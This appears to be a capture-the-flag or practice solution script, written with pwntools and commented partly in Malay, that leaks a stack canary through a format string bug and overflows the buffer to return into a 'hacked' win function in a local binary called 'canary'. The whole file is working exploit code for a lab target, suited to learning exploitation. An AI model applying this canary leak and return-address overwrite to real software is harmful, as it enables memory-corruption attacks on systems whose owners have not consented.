
from pwn import *

elf = context.binary = ELF('./canary')
io = process()

# *** IMPORTANT ***

# Load dalam Ghidra first to find the alignment for the canary


# Stack canaries are loaded on the stack and immediately after the buffer
# Find the canary initially in the stack pointer (gdb), letak breakpoint lepas dia print input

# Value of canary can be leaked via format string vuln

offset = 64

io.sendlineafter(b'!\n','%23$p')
canary = int(io.recvline(), 16)

log.success(f'Canary: {hex(canary)}')

payload = flat(
    b'A' * offset,  # Pad to canary (64)
    canary,         # Our leaked canary (4)
    b'A' * 12,      # Pad to Ret pointer (12)
    elf.sym['hacked']   # Ret2win (64 + 4 + 12 = 80)
)

io.sendline(payload)
io.interactive()

# Return is bcs its still in the function need to keluaq
